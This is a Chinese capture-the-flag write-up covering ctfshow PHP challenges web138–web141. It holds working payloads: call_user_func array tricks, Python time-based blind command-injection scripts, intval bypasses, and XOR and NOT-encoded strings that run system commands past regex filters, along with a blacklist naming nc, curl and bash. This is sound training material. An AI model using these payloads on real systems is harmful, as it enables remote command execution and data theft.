&lt;p&gt;&lt;strong&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; 与 &lt;code&gt;::&lt;/code&gt; 调用函数的区别：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; 调用对象实例方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;&lt;code&gt;::&lt;/code&gt; 调用静态方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调用类中静态函数，POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;ctfshow=ctfshow::getFlag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250814233120051.png&#34; alt=&#34;image-20250814233120051&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web138&#34;&gt;&lt;a href=&#34;#web138&#34; class=&#34;headerlink&#34; title=&#34;web138&#34;&gt;&lt;/a&gt;web138&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:52:13

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&amp;#123;
    function __wakeup()&amp;#123;
        die(&amp;quot;private class&amp;quot;);
    &amp;#125;
    static function getFlag()&amp;#123;
        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
    &amp;#125;
&amp;#125;

if(strripos($_POST[&amp;#39;ctfshow&amp;#39;], &amp;quot;:&amp;quot;)&amp;gt;-1)&amp;#123;
    die(&amp;quot;private function&amp;quot;);
&amp;#125;

call_user_func($_POST[&amp;#39;ctfshow&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;call_user_func&lt;/code&gt; 函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250814235051228.png&#34; alt=&#34;image-20250814235051228&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web139&#34;&gt;&lt;a href=&#34;#web139&#34; class=&#34;headerlink&#34; title=&#34;web139&#34;&gt;&lt;/a&gt;web139&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
function check($x)&amp;#123;
    if(preg_match(&amp;#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\&amp;#123;|\&amp;#125;|\&amp;gt;|\&amp;lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&amp;#39;, $x))&amp;#123;
        die(&amp;#39;too young too simple sometimes naive!&amp;#39;);
    &amp;#125;
&amp;#125;
if(isset($_GET[&amp;#39;c&amp;#39;]))&amp;#123;
    $c=$_GET[&amp;#39;c&amp;#39;];
    check($c);
    exec($c);
&amp;#125;
else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;#awk命令逐行获取数据
┌──(kali㉿kali)-[~]
└─$ cat flag.php
test
flag&amp;#123;love&amp;#125;

┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==1
test

┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==2
flag&amp;#123;love&amp;#125;

#cut命令逐列获取单个字符
┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==2|cut -c 1
f

┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==2|cut -c 2
l

┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==2|cut -c 3
a

┌──(kali㉿kali)-[~]
└─$ cat flag.php|awk NR==2|cut -c 3
g

#if语句判断命令是否执行（fi表示if语句结束）
┌──(kali㉿kali)-[~]
└─$ if[$(cat flag.php|awk NR==2|cut -c 1)=f];then echo yes;fi
yes

┌──(kali㉿kali)-[~]
└─$ if[$(cat flag.php|awk NR==2|cut -c 2)=l];then echo yes;fi
yes
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;根据以上，利用脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;列出根目录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# 加快版脚本
import requests
from requests.exceptions import ReadTimeout
from concurrent.futures import ThreadPoolExecutor

url = &amp;quot;http://ecf960c9-494a-4d2e-b3ba-d7f31745da83.challenge.ctf.show/&amp;quot;

def try_char(i, j, ascii_code):
    char = chr(ascii_code)
    payload = f&amp;quot;?c=if [ `ls / | awk NR==&amp;#123;i&amp;#125; | cut -c &amp;#123;j&amp;#125;` == &amp;#123;char&amp;#125; ];then sleep 2;fi&amp;quot;
    try:
        requests.get(url + payload, timeout=(1.5, 1.5))
    except ReadTimeout:
        return char
    return None

def get_char(i, j):
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(try_char, i, j, ascii_code) for ascii_code in range(32, 128)]
        for f in futures:
            ch = f.result()
            if ch:
                return ch
    return &amp;quot;&amp;quot;

result = &amp;quot;&amp;quot;
for i in range(1, 5):
    for j in range(1, 15):
        ch = get_char(i, j)
        if not ch:
            break
        result += ch
        print(result)
    result += &amp;quot; &amp;quot;

print(&amp;quot;Final result:&amp;quot;, result)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250815001418242.png&#34; alt=&#34;image-20250815001418242&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;cat f149_15_h3r3&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;普通版脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# 普通版脚本
import requests
url = &amp;quot;http://ecf960c9-494a-4d2e-b3ba-d7f31745da83.challenge.ctf.show/&amp;quot;
result = &amp;quot;&amp;quot;
for j in range(1,60):
    for k in range(32,128):
        k=chr(k)
        payload = &amp;quot;?c=&amp;quot; + f&amp;quot;if [ `cat /f149_15_h3r3 | cut -c &amp;#123;j&amp;#125;` == &amp;#123;k&amp;#125; ];then sleep 2;fi&amp;quot;
        try:
            requests.get(url=url+payload, timeout=(1.5,1.5))
        except:
            result = result + k
            print(result)
            break
result += &amp;quot; &amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;增加并发版脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = &amp;quot;http://ecf960c9-494a-4d2e-b3ba-d7f31745da83.challenge.ctf.show/&amp;quot;
result = [&amp;quot;&amp;quot;] * 59  # 假设长度59

def try_char(pos, char):
    payload = &amp;quot;?c=&amp;quot; + f&amp;quot;if [ `cat /f149_15_h3r3 | cut -c &amp;#123;pos&amp;#125;` == &amp;#39;&amp;#123;char&amp;#125;&amp;#39; ];then sleep 2;fi&amp;quot;
    try:
        requests.get(url=url+payload, timeout=(1.5,1.5))
        return None
    except:
        return (pos, char)

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = []
    for j in range(1, 60):
        for k in range(32, 128):
            futures.append(executor.submit(try_char, j, chr(k)))
    for future in as_completed(futures):
        res = future.result()
        if res:
            pos, char = res
            result[pos-1] = char
            print(&amp;quot;&amp;quot;.join(result))
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250815005026928.png&#34; alt=&#34;image-20250815005026928&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web140&#34;&gt;&lt;a href=&#34;#web140&#34; class=&#34;headerlink&#34; title=&#34;web140&#34;&gt;&lt;/a&gt;web140&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 12:39:25

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&amp;#39;f1&amp;#39;]) &amp;amp;&amp;amp; isset($_POST[&amp;#39;f2&amp;#39;]))&amp;#123;
    $f1 = (String)$_POST[&amp;#39;f1&amp;#39;];
    $f2 = (String)$_POST[&amp;#39;f2&amp;#39;];
    if(preg_match(&amp;#39;/^[a-z0-9]+$/&amp;#39;, $f1))&amp;#123;
        if(preg_match(&amp;#39;/^[a-z0-9]+$/&amp;#39;, $f2))&amp;#123;
            $code = eval(&amp;quot;return $f1($f2());&amp;quot;);
            if(intval($code) == &amp;#39;ctfshow&amp;#39;)&amp;#123;
                echo file_get_contents(&amp;quot;flag.php&amp;quot;);
            &amp;#125;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;intval()&lt;/code&gt;函数会将非数字或非数字字符串转换为0&lt;/p&gt;
&lt;p&gt;0和字符串进行弱比较的时候返回的是 &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此控制 &lt;code&gt;eval&lt;/code&gt; 执行的结果是 &lt;code&gt;0&lt;/code&gt; 或者是 &lt;code&gt;NULL&lt;/code&gt; 即可满足条件，但是不能报错&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload可以由很多函数搭配而成&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;f1=md5&amp;amp;f2=md5

f1=usleep&amp;amp;f2=usleep  #usleep没有返回值。所以intval参数为空，失败返回0

f1=gmdate&amp;amp;f2=gmdate  #array getdate([ int $timestamp = time()] )：返回结果是array关联数组，参   				   数必须是int型。
                     #所以getdate(getdate())----&amp;gt;getdate(array型)—&amp;gt;失败返回flase，intval为0。

f1=intval&amp;amp;f2=intval

f1=system&amp;amp;f2=system   #system()必须包含参数，失败返回FLASE; system(&amp;#39;FLASE&amp;#39;),空指令，失败返回                            FLASE。
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250815012341113.png&#34; alt=&#34;image-20250815012341113&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web141&#34;&gt;&lt;a href=&#34;#web141&#34; class=&#34;headerlink&#34; title=&#34;web141&#34;&gt;&lt;/a&gt;web141&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:28:09

*/

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v3&amp;#39;]))&amp;#123;
    $v1 = (String)$_GET[&amp;#39;v1&amp;#39;];
    $v2 = (String)$_GET[&amp;#39;v2&amp;#39;];
    $v3 = (String)$_GET[&amp;#39;v3&amp;#39;];

    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&amp;#39;/^\W+$/&amp;#39;, $v3))&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;\W&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;匹配一个 &lt;strong&gt;非单词字符&lt;/strong&gt;（word character 取反）。&lt;/li&gt;
&lt;li&gt;单词字符的定义：&lt;code&gt;[A-Za-z0-9_]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;所以 &lt;code&gt;\W&lt;/code&gt; 相当于 &lt;code&gt;[^A-Za-z0-9_]&lt;/code&gt;，包括：&lt;ul&gt;
&lt;li&gt;空格&lt;/li&gt;
&lt;li&gt;标点符号&lt;/li&gt;
&lt;li&gt;特殊符号（&lt;code&gt;@#$%^&amp;amp;*&lt;/code&gt; 等）&lt;/li&gt;
&lt;li&gt;非 ASCII 字母数字（比如中文、日文等）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;注意&amp;#x3D;&amp;#x3D;：&lt;code&gt;\w&lt;/code&gt; 和 &lt;code&gt;\W&lt;/code&gt; 是一对正好相反的匹配符；&lt;code&gt;\w&lt;/code&gt;：单词字符（字母、数字、下划线）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1system(&amp;quot;whoami&amp;quot;);&lt;/code&gt;   error不会执行（PHP 在解析源码时会报 &lt;code&gt;Parse error&lt;/code&gt;（语法错误））&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;&lt;code&gt;1+system(&amp;quot;whoami&amp;quot;);&lt;/code&gt; Warning 会执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=*(&amp;quot;%08%02%08%08%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7c%60%60&amp;quot;)(&amp;quot;%0c%08&amp;quot;^&amp;quot;%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816133002396.png&#34; alt=&#34;image-20250816133002396&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250815180230367.png&#34; alt=&#34;image-20250815180230367&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=*(&amp;quot;%08%02%08%08%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7c%60%60&amp;quot;)(&amp;quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&amp;quot;^&amp;quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816133100062.png&#34; alt=&#34;image-20250816133100062&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250815180335799.png&#34; alt=&#34;image-20250815180335799&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;rce_xor.py&lt;/code&gt; 异或&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#rce_xor.py
import re

# 预生成 XOR 映射表，存入字典
def build_xor_table():
    preg = &amp;#39;[a-zA-Z0-9]&amp;#39;
    xor_map = &amp;#123;&amp;#125;
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if 32 &amp;lt;= k &amp;lt;= 126:
                    a = &amp;#39;%&amp;#39; + hex(i)[2:].zfill(2)
                    b = &amp;#39;%&amp;#39; + hex(j)[2:].zfill(2)
                    # 只存第一次找到的即可
                    if chr(k) not in xor_map:
                        xor_map[chr(k)] = (a, b)
    return xor_map


# 根据输入字符串生成异或表达式
def action(arg, xor_map):
    s1, s2 = &amp;quot;&amp;quot;, &amp;quot;&amp;quot;
    for ch in arg:
        if ch not in xor_map:
            raise ValueError(f&amp;quot;[-] 字符 &amp;#123;ch&amp;#125; 无法生成&amp;quot;)
        a, b = xor_map[ch]
        s1 += a
        s2 += b
    return f&amp;quot;(\&amp;quot;&amp;#123;s1&amp;#125;\&amp;quot;^\&amp;quot;&amp;#123;s2&amp;#125;\&amp;quot;)&amp;quot;


def main():
    xor_map = build_xor_table()
    while True:
        s1 = input(&amp;quot;\n[+] your function：&amp;quot;)
        if s1.lower() == &amp;quot;exit&amp;quot;:
            break
        s2 = input(&amp;quot;[+] your command：&amp;quot;)
        param = action(s1, xor_map) + action(s2, xor_map)
        print(&amp;quot;\n[*] result:\n&amp;quot; + param)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用取反命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
function encode_not($str) &amp;#123;
    return &amp;quot;(~&amp;quot; . urlencode(~$str) . &amp;quot;)&amp;quot;;
&amp;#125;

echo encode_not(&amp;quot;system&amp;quot;) . &amp;quot;\n&amp;quot;;
echo encode_not(&amp;quot;tac flag.php&amp;quot;) . &amp;quot;\n&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816141404342.png&#34; alt=&#34;image-20250816141404342&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=*(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816141436616.png&#34; alt=&#34;image-20250816141436616&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
